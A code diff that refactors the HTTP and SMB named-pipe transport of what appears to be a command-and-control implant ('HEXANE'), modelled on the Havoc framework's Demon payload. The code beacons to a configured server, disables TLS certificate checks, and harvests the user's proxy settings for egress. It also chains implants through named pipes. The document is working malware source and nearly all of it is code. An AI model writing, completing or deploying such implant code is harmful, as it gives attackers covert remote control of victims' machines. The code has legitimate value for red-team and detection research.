@@ -2,34 +2,34 @@
 namespace Http {
     // https://github.com/HavocFramework/Havoc/blob/ea3646e055eb1612dcc956130fd632029dbf0b86/payloads/Demon/src/core/TransportHttp.c#L21
 
-    VOID HttpCallback(PSTREAM Outbound, PSTREAM *Inbound) {
+    VOID HttpCallback(_stream *out, _stream **in) {
         HEXANE
 
-        HINTERNET Connect = nullptr;
-        HINTERNET Request = nullptr;
+        HINTERNET connect = nullptr;
+        HINTERNET request = nullptr;
 
-        WINHTTP_PROXY_INFO ProxyInfo = { };
-        WINHTTP_CURRENT_USER_IE_PROXY_CONFIG ProxyConfig = { };
-        WINHTTP_AUTOPROXY_OPTIONS AutoProxyOptions = { };
+        WINHTTP_PROXY_INFO proxy_info = { };
+        WINHTTP_CURRENT_USER_IE_PROXY_CONFIG proxy_config = { };
+        WINHTTP_AUTOPROXY_OPTIONS autoproxy_opts = { };
 
-        LPVOID Buffer       = { };
-        LPVOID Download     = { };
+        LPVOID buffer       = { };
+        LPVOID download     = { };
 
-        ULONG Read          = 0;
-        ULONG Length        = 0;
-        ULONG Total         = 0;
-        ULONG Status        = 0;
-        ULONG nStatus       = sizeof(ULONG);
+        ULONG read          = 0;
+        ULONG length        = 0;
+        ULONG total         = 0;
+        ULONG status        = 0;
+        ULONG n_status      = sizeof(ULONG);
 
-        LPWSTR Header       = { };
-        LPWSTR Endpoint     = { };
-        ULONG Flags         = 0;
-        ULONG nEndpoint     = 0;
-        ULONG nHeaders      = 0;
+        LPWSTR header       = { };
+        LPWSTR endpoint     = { };
+        ULONG flags         = 0;
+        ULONG n_endpoint    = 0;
+        ULONG n_headers     = 0;
 
         HANDLE TestToken = { };
 
-        Ctx->Transport.http->Method = C_CAST(CONST LPWSTR, L"GET");
+        Ctx->Transport.http->Method = C_CAST(wchar_t*, L"GET");
 
         if (!Ctx->Transport.http->Handle) {
             if (!(Ctx->Transport.http->Handle = Ctx->win32.WinHttpOpen(Ctx->Transport.http->Useragent, WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0))) {
@@ -37,29 +37,29 @@ namespace Http {
             }
         }
 
-        if (!(Connect = Ctx->win32.WinHttpConnect(Ctx->Transport.http->Handle, Ctx->Transport.http->Address, Ctx->Transport.http->Port, 0))) {
+        if (!(connect = Ctx->win32.WinHttpConnect(Ctx->Transport.http->Handle, Ctx->Transport.http->Address, Ctx->Transport.http->Port, 0))) {
             return_defer(ntstatus);
         }
 
-        nEndpoint   = Random::RandomNumber32();
-        Endpoint    = Ctx->Transport.http->Endpoints[nEndpoint % Ctx->Transport.http->nEndpoints];
-        Flags       = WINHTTP_FLAG_BYPASS_PROXY_CACHE;
+        n_endpoint  = Utils::Random::RandomNumber32();
+        endpoint    = Ctx->Transport.http->Endpoints[n_endpoint % Ctx->Transport.http->nEndpoints];
+        flags       = WINHTTP_FLAG_BYPASS_PROXY_CACHE;
 
         if (Ctx->Transport.bSSL) {
-            Flags |= WINHTTP_FLAG_SECURE;
+            flags |= WINHTTP_FLAG_SECURE;
         }
 
-        if (!(Request = Ctx->win32.WinHttpOpenRequest(Connect, Ctx->Transport.http->Method, Endpoint, nullptr, nullptr, nullptr, Flags))) {
+        if (!(request = Ctx->win32.WinHttpOpenRequest(connect, Ctx->Transport.http->Method, endpoint, nullptr, nullptr, nullptr, flags))) {
             return_defer(ntstatus);
         }
 
         if (Ctx->Transport.bSSL) {
-            Flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
+            flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                     SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                     SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                     SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
 
-            if (!Ctx->win32.WinHttpSetOption(Request, WINHTTP_OPTION_SECURITY_FLAGS, &Flags, sizeof(ULONG))) {
+            if (!Ctx->win32.WinHttpSetOption(request, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(ULONG))) {
                 return_defer(ntstatus);
             }
         }
@@ -67,10 +67,10 @@ namespace Http {
         if (Ctx->Transport.http->Headers) {
             // macro is redundant and silly but makes the code looks nicer/ slightly less typing.
             DYN_ARRAY_EXPR(
-                nHeaders, Ctx->Transport.http->Headers,
-                Header = Ctx->Transport.http->Headers[nHeaders];
+                n_headers, Ctx->Transport.http->Headers,
+                header = Ctx->Transport.http->Headers[n_headers];
 
-            if (!Ctx->win32.WinHttpAddRequestHeaders(Request, Header, -1, WINHTTP_ADDREQ_FLAG_ADD)) {
+            if (!Ctx->win32.WinHttpAddRequestHeaders(request, header, -1, WINHTTP_ADDREQ_FLAG_ADD)) {
                 return_defer(ntstatus);
             });
         }
@@ -78,60 +78,60 @@ namespace Http {
         if (Ctx->Transport.bProxy) {
             // Proxy-Awareness : https://github.com/HavocFramework/Havoc/blob/ea3646e055eb1612dcc956130fd632029dbf0b86/payloads/Demon/src/core/TransportHttp.c#L138
 
-            ProxyInfo.dwAccessType  = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
-            ProxyInfo.lpszProxy     = Ctx->Transport.http->ProxyAddress;
+            proxy_info.dwAccessType  = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
+            proxy_info.lpszProxy     = Ctx->Transport.http->ProxyAddress;
 
-            if (!Ctx->win32.WinHttpSetOption(Request, WINHTTP_OPTION_PROXY, &ProxyInfo, sizeof(WINHTTP_PROXY_INFO))) {
+            if (!Ctx->win32.WinHttpSetOption(request, WINHTTP_OPTION_PROXY, &proxy_info, sizeof(WINHTTP_PROXY_INFO))) {
                 return_defer(ntstatus);
             }
 
             if (Ctx->Transport.http->ProxyUsername && Ctx->Transport.http->ProxyPassword) {
                 if (
-                    !Ctx->win32.WinHttpSetOption(Request, WINHTTP_OPTION_PROXY_USERNAME, Ctx->Transport.http->ProxyUsername, x_wcslen(Ctx->Transport.http->ProxyUsername)) ||
-                    !Ctx->win32.WinHttpSetOption(Request, WINHTTP_OPTION_PROXY_PASSWORD, Ctx->Transport.http->ProxyPassword, x_wcslen(Ctx->Transport.http->ProxyPassword))) {
+                    !Ctx->win32.WinHttpSetOption(request, WINHTTP_OPTION_PROXY_USERNAME, Ctx->Transport.http->ProxyUsername, x_wcslen(Ctx->Transport.http->ProxyUsername)) ||
+                    !Ctx->win32.WinHttpSetOption(request, WINHTTP_OPTION_PROXY_PASSWORD, Ctx->Transport.http->ProxyPassword, x_wcslen(Ctx->Transport.http->ProxyPassword))) {
                     return_defer(ntstatus);
                 }
             }
         } else if (!Ctx->Transport.bEnvProxyCheck) {
 
-            AutoProxyOptions.dwFlags                = WINHTTP_AUTOPROXY_AUTO_DETECT;
-            AutoProxyOptions.dwAutoDetectFlags      = WINHTTP_AUTO_DETECT_TYPE_DHCP | WINHTTP_AUTO_DETECT_TYPE_DNS_A;
-            AutoProxyOptions.lpszAutoConfigUrl      = nullptr;
-            AutoProxyOptions.lpvReserved            = nullptr;
-            AutoProxyOptions.dwReserved             = 0;
-            AutoProxyOptions.fAutoLogonIfChallenged = TRUE;
+            autoproxy_opts.dwFlags                = WINHTTP_AUTOPROXY_AUTO_DETECT;
+            autoproxy_opts.dwAutoDetectFlags      = WINHTTP_AUTO_DETECT_TYPE_DHCP | WINHTTP_AUTO_DETECT_TYPE_DNS_A;
+            autoproxy_opts.lpszAutoConfigUrl      = nullptr;
+            autoproxy_opts.lpvReserved            = nullptr;
+            autoproxy_opts.dwReserved             = 0;
+            autoproxy_opts.fAutoLogonIfChallenged = TRUE;
 
-            if (Ctx->win32.WinHttpGetProxyForUrl(Ctx->Transport.http->Handle, Endpoint, &AutoProxyOptions, &ProxyInfo)) {
+            if (Ctx->win32.WinHttpGetProxyForUrl(Ctx->Transport.http->Handle, endpoint, &autoproxy_opts, &proxy_info)) {
                 Ctx->Transport.EnvProxyLen  = sizeof(WINHTTP_PROXY_INFO);
-                Ctx->Transport.EnvProxy     = Ctx->Nt.RtlAllocateHeap(Ctx->Heap, NULL, Ctx->Transport.EnvProxyLen);
+                Ctx->Transport.EnvProxy     = Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, Ctx->Transport.EnvProxyLen);
 
-                x_memcpy(Ctx->Transport.EnvProxy, &ProxyInfo, Ctx->Transport.EnvProxyLen);
+                x_memcpy(Ctx->Transport.EnvProxy, &proxy_info, Ctx->Transport.EnvProxyLen);
 
             } else {
-                if (Ctx->win32.WinHttpGetIEProxyConfigForCurrentUser(&ProxyConfig)) {
+                if (Ctx->win32.WinHttpGetIEProxyConfigForCurrentUser(&proxy_config)) {
 
-                    if (ProxyConfig.lpszProxy != nullptr && x_wcslen(ProxyConfig.lpszProxy) != 0) {
-                        ProxyInfo.dwAccessType      = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
-                        ProxyInfo.lpszProxy         = ProxyConfig.lpszProxy;
-                        ProxyInfo.lpszProxyBypass   = ProxyConfig.lpszProxyBypass;
+                    if (proxy_config.lpszProxy != nullptr && x_wcslen(proxy_config.lpszProxy) != 0) {
+                        proxy_info.dwAccessType      = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
+                        proxy_info.lpszProxy         = proxy_config.lpszProxy;
+                        proxy_info.lpszProxyBypass   = proxy_config.lpszProxyBypass;
                         Ctx->Transport.EnvProxyLen  = sizeof(WINHTTP_PROXY_INFO);
 
                         Ctx->Transport.EnvProxy = Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, Ctx->Transport.EnvProxyLen);
-                        x_memcpy(Ctx->Transport.EnvProxy, &ProxyInfo, Ctx->Transport.EnvProxyLen);
+                        x_memcpy(Ctx->Transport.EnvProxy, &proxy_info, Ctx->Transport.EnvProxyLen);
 
-                        ProxyConfig.lpszProxy       = nullptr;
-                        ProxyConfig.lpszProxyBypass = nullptr;
+                        proxy_config.lpszProxy       = nullptr;
+                        proxy_config.lpszProxyBypass = nullptr;
 
-                    } else if (ProxyConfig.lpszAutoConfigUrl != nullptr && x_wcslen(ProxyConfig.lpszAutoConfigUrl) != 0) {
-                        AutoProxyOptions.dwFlags            = WINHTTP_AUTOPROXY_CONFIG_URL;
-                        AutoProxyOptions.lpszAutoConfigUrl  = ProxyConfig.lpszAutoConfigUrl;
-                        AutoProxyOptions.dwAutoDetectFlags  = 0;
+                    } else if (proxy_config.lpszAutoConfigUrl != nullptr && x_wcslen(proxy_config.lpszAutoConfigUrl) != 0) {
+                        autoproxy_opts.dwFlags            = WINHTTP_AUTOPROXY_CONFIG_URL;
+                        autoproxy_opts.lpszAutoConfigUrl  = proxy_config.lpszAutoConfigUrl;
+                        autoproxy_opts.dwAutoDetectFlags  = 0;
 
-                        Ctx->win32.WinHttpGetProxyForUrl(Ctx->Transport.http->Handle, Endpoint, &AutoProxyOptions, &ProxyInfo);
+                        Ctx->win32.WinHttpGetProxyForUrl(Ctx->Transport.http->Handle, endpoint, &autoproxy_opts, &proxy_info);
                         Ctx->Transport.EnvProxyLen  = sizeof(WINHTTP_PROXY_INFO);
 
                         Ctx->Transport.EnvProxy = Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, Ctx->Transport.EnvProxyLen);
-                        x_memcpy(Ctx->Transport.EnvProxy, &ProxyInfo, Ctx->Transport.EnvProxyLen);
+                        x_memcpy(Ctx->Transport.EnvProxy, &proxy_info, Ctx->Transport.EnvProxyLen);
                     }
                 }
             }
@@ -139,7 +139,7 @@ namespace Http {
         }
 
         if (Ctx->Transport.EnvProxy) {
-            if (!Ctx->win32.WinHttpSetOption(Request, WINHTTP_OPTION_PROXY, Ctx->Transport.EnvProxy, Ctx->Transport.EnvProxyLen)) {
+            if (!Ctx->win32.WinHttpSetOption(request, WINHTTP_OPTION_PROXY, Ctx->Transport.EnvProxy, Ctx->Transport.EnvProxyLen)) {
                 return_defer(ntstatus);
             }
         }
@@ -150,58 +150,58 @@ namespace Http {
         }
         // ZwOpenThreadToken fails : NtCurrentThread STATUS_NO_TOKEN (?)
         if (
-            !Ctx->win32.WinHttpSendRequest(Request, nullptr, 0, Outbound->Buffer, Outbound->Length, Outbound->Length, 0) ||
-            !Ctx->win32.WinHttpReceiveResponse(Request, nullptr)) {
+            !Ctx->win32.WinHttpSendRequest(request, nullptr, 0, out->Buffer, out->Length, out->Length, 0) ||
+            !Ctx->win32.WinHttpReceiveResponse(request, nullptr)) {
             return_defer(ntstatus);
         }
 
-        if (!Ctx->win32.WinHttpQueryHeaders(Request, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, nullptr, &Status, &nStatus, nullptr)) {
+        if (!Ctx->win32.WinHttpQueryHeaders(request, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, nullptr, &status, &n_status, nullptr)) {
             return_defer(ntstatus);
         }
-        if (Status != HTTP_STATUS_OK) {
-            return_defer(Status);
+        if (status != HTTP_STATUS_OK) {
+            return_defer(status);
         }
 
         do {
             if (
-                !(Ctx->win32.WinHttpQueryDataAvailable(Request, &Length))) {
+                !(Ctx->win32.WinHttpQueryDataAvailable(request, &length))) {
                 return_defer(ntstatus);
             }
 
-            if (!Buffer) {
-                Buffer = Ctx->Nt.RtlAllocateHeap(Ctx->Heap, HEAP_ZERO_MEMORY, Length + 1);
+            if (!buffer) {
+                buffer = Ctx->Nt.RtlAllocateHeap(Ctx->Heap, HEAP_ZERO_MEMORY, length + 1);
             }
 
-            if (!Download) {
-                Download = Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, Length + 1);
+            if (!download) {
+                download = Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, length + 1);
             } else {
-                Download = Ctx->Nt.RtlReAllocateHeap(Ctx->Heap, 0, Download, Total + Length + 1);
+                download = Ctx->Nt.RtlReAllocateHeap(Ctx->Heap, 0, download, total + length + 1);
             }
 
-            x_memset(Buffer, 0, Length + 1);
+            x_memset(buffer, 0, length + 1);
 
-            if (!Ctx->win32.WinHttpReadData(Request, Buffer, Length, &Read)) {
+            if (!Ctx->win32.WinHttpReadData(request, buffer, length, &read)) {
                 return_defer(ntstatus);
             }
 
-            x_memcpy(S_CAST(PBYTE, Download) + Total, Buffer, Read);
-            ZeroFreePtr(Buffer, Read);
+            x_memcpy(B_PTR(download) + total, buffer, read);
+            ZeroFreePtr(buffer, read);
 
-            Total += Read;
+            total += read;
 
-        } while (Length > 0);
+        } while (length > 0);
 
-        (*Inbound) = S_CAST(PSTREAM, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, sizeof(STREAM)));
-        (*Inbound)->Buffer = Download;
-        (*Inbound)->Length = Total;
+        (*in) = S_CAST(_stream*, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, sizeof(_stream)));
+        (*in)->Buffer = download;
+        (*in)->Length = total;
 
         defer:
-        if (Request) { Ctx->win32.WinHttpCloseHandle(Request); }
-        if (Connect) { Ctx->win32.WinHttpCloseHandle(Connect); }
+        if (request) { Ctx->win32.WinHttpCloseHandle(request); }
+        if (connect) { Ctx->win32.WinHttpCloseHandle(connect); }
 
-        if (ProxyConfig.lpszProxy) { Ctx->Nt.RtlFreeHeap(Ctx->Heap, 0, ProxyConfig.lpszProxy); }
-        if (ProxyConfig.lpszProxyBypass) { Ctx->Nt.RtlFreeHeap(Ctx->Heap, 0, ProxyConfig.lpszProxyBypass); }
-        if (ProxyConfig.lpszAutoConfigUrl) { Ctx->Nt.RtlFreeHeap(Ctx->Heap, 0, ProxyConfig.lpszAutoConfigUrl); }
+        if (proxy_config.lpszProxy) { Ctx->Nt.RtlFreeHeap(Ctx->Heap, 0, proxy_config.lpszProxy); }
+        if (proxy_config.lpszProxyBypass) { Ctx->Nt.RtlFreeHeap(Ctx->Heap, 0, proxy_config.lpszProxyBypass); }
+        if (proxy_config.lpszAutoConfigUrl) { Ctx->Nt.RtlFreeHeap(Ctx->Heap, 0, proxy_config.lpszAutoConfigUrl); }
     }
 }
 
@@ -286,89 +286,89 @@ namespace Smb {
         }
     }
 
-    BOOL PipeRead(PSTREAM Inbound, HANDLE Handle) {
+    BOOL PipeRead(_stream *in, HANDLE handle) {
         HEXANE
 
-        ULONG Read = 0;
-        ULONG Total = 0;
+        ULONG read = 0;
+        ULONG total = 0;
 
         do {
-            if (!Ctx->win32.ReadFile(Handle, S_CAST(PBYTE, Inbound->Buffer) + Total, MIN((Inbound->Length - Total), PIPE_BUFFER_MAX), &Read, nullptr)) {
+            if (!Ctx->win32.ReadFile(handle, B_PTR(in->Buffer) + total, MIN((in->Length - total), PIPE_BUFFER_MAX), &read, nullptr)) {
                 if (ntstatus == ERROR_NO_DATA) {
                     return FALSE;
                 }
             }
 
-            Total += Read;
-        } while (Total < Inbound->Length);
+            total += read;
+        } while (total < in->Length);
         return TRUE;
     }
 
-    BOOL PipeWrite(PSTREAM Outbound, HANDLE Handle) {
+    BOOL PipeWrite(_stream *out, HANDLE handle) {
         HEXANE
 
-        ULONG Total = 0;
-        ULONG Write = 0;
+        ULONG total = 0;
+        ULONG write = 0;
 
         do {
-            if (!Ctx->win32.WriteFile(Handle, S_CAST(PBYTE, Outbound->Buffer) + Total, MIN((Outbound->Length - Total), PIPE_BUFFER_MAX), &Write, nullptr)) {
+            if (!Ctx->win32.WriteFile(handle, B_PTR(out->Buffer) + total, MIN((out->Length - total), PIPE_BUFFER_MAX), &write, nullptr)) {
                 return FALSE;
             }
 
-            Total += Write;
-        } while (Total < Outbound->Length);
+            total += write;
+        } while (total < out->Length);
         return TRUE;
     }
 
-    VOID PeerConnectIngress (PSTREAM Outbound, PSTREAM *Inbound) {
+    VOID PeerConnectIngress (_stream *out, _stream **in) {
         HEXANE
 
-        HANDLE Handle = Ctx->Config.IngressPipename;
-        SMB_PIPE_SEC_ATTR SmbSecAttr = { };
-        SECURITY_ATTRIBUTES SecAttr = { };
+        HANDLE handle               = Ctx->Config.IngressPipename;
+        SMB_PIPE_SEC_ATTR smb_attr  = { };
+        SECURITY_ATTRIBUTES sec_attr = { };
 
-        ULONG cbBytes = 0;
-        ULONG MsgSize = 0;
-        ULONG PeerId = 0;
+        ULONG n_bytes   = 0;
+        ULONG msg_length = 0;
+        ULONG peer_id   = 0;
 
-        if (!Handle) {
-            SmbContextInit(&SmbSecAttr, &SecAttr);
-            if (!(Handle = Ctx->win32.CreateNamedPipeW(Ctx->Config.IngressPipename, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, PIPE_BUFFER_MAX, PIPE_BUFFER_MAX, 0, &SecAttr))) {
+        if (!handle) {
+            SmbContextInit(&smb_attr, &sec_attr);
+            if (!(handle = Ctx->win32.CreateNamedPipeW(Ctx->Config.IngressPipename, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, PIPE_BUFFER_MAX, PIPE_BUFFER_MAX, 0, &sec_attr))) {
                 return_defer(ntstatus);
             }
 
-            SmbContextDestroy(&SmbSecAttr);
-            if (!Ctx->win32.ConnectNamedPipe(Handle, nullptr)) {
+            SmbContextDestroy(&smb_attr);
+            if (!Ctx->win32.ConnectNamedPipe(handle, nullptr)) {
                 return_defer(ERROR_BROKEN_PIPE);
             }
         }
 
-        if (!Ctx->win32.PeekNamedPipe(Handle, nullptr, 0, nullptr, &cbBytes, nullptr)) {
+        if (!Ctx->win32.PeekNamedPipe(handle, nullptr, 0, nullptr, &n_bytes, nullptr)) {
             return_defer(ntstatus);
         }
 
-        if (cbBytes > sizeof(uint32_t) * 2) {
-            MsgSize = cbBytes;
+        if (n_bytes > sizeof(uint32_t) * 2) {
+            msg_length = n_bytes;
 
-            if (!Ctx->win32.ReadFile(Handle, &PeerId, sizeof(uint32_t), &cbBytes, nullptr)) {
+            if (!Ctx->win32.ReadFile(handle, &peer_id, sizeof(uint32_t), &n_bytes, nullptr)) {
                 return_defer(ntstatus);
             }
-            if (Ctx->Session.PeerId != PeerId) {
+            if (Ctx->Session.PeerId != peer_id) {
                 return_defer(ERROR_NOT_READY);
             }
 
-            (*Inbound) = S_CAST(PSTREAM, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, sizeof(STREAM)));
-            (*Inbound)->Buffer = Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, MsgSize);
-            (*Inbound)->Length = MsgSize;
+            (*in) = S_CAST(_stream*, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, sizeof(_stream)));
+            (*in)->Buffer = Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, msg_length);
+            (*in)->Length = msg_length;
 
-            PipeRead(*Inbound, Handle);
+            PipeRead(*in, handle);
 
         } else {
             return_defer(ERROR_INSUFFICIENT_BUFFER);
         }
 
-        if (Outbound) {
-            if (!PipeWrite(Outbound, Handle)) {
+        if (out) {
+            if (!PipeWrite(out, handle)) {
                 return_defer(ERROR_WRITE_FAULT);
             }
         }
@@ -376,16 +376,16 @@ namespace Smb {
         defer:
     }
 
-    VOID PeerConnectEgress(PSTREAM Outbound, PSTREAM *Inbound) {
+    VOID PeerConnectEgress(_stream *out, _stream **in) {
         HEXANE
 
-        auto Handle = Ctx->Config.EgressHandle;
-        auto Pipename = Ctx->Config.EgressPipename;
+        auto handle = Ctx->Config.EgressHandle;
+        auto pipename = Ctx->Config.EgressPipename;
 
-        if (!(Handle = Ctx->win32.CreateFileW(Pipename, GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr))) {
-            if (Handle == INVALID_HANDLE_VALUE && ntstatus == ERROR_PIPE_BUSY) {
+        if (!(handle = Ctx->win32.CreateFileW(pipename, GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr))) {
+            if (handle == INVALID_HANDLE_VALUE && ntstatus == ERROR_PIPE_BUSY) {
 
-                if (!Ctx->win32.WaitNamedPipeW(Pipename, 5000)) {
+                if (!Ctx->win32.WaitNamedPipeW(pipename, 5000)) {
                     return_defer(ERROR_NOT_READY);
                 }
             } else {
@@ -393,17 +393,17 @@ namespace Smb {
             }
         }
 
-        if (Ctx->win32.PeekNamedPipe(Handle, nullptr, 0, nullptr, &(*Inbound)->Length, nullptr)) {
-            if ((*Inbound)->Length > 0) {
+        if (Ctx->win32.PeekNamedPipe(handle, nullptr, 0, nullptr, &(*in)->Length, nullptr)) {
+            if ((*in)->Length > 0) {
 
-                if (!PipeRead(*Inbound, Handle)) {
+                if (!PipeRead(*in, handle)) {
                     return_defer(ntstatus);
                 }
             } else {
                 return_defer(ERROR_INSUFFICIENT_BUFFER);
             }
         }
-        if (!PipeWrite(Outbound, Handle)) {
+        if (!PipeWrite(out, handle)) {
             return_defer(ntstatus);
         }
 
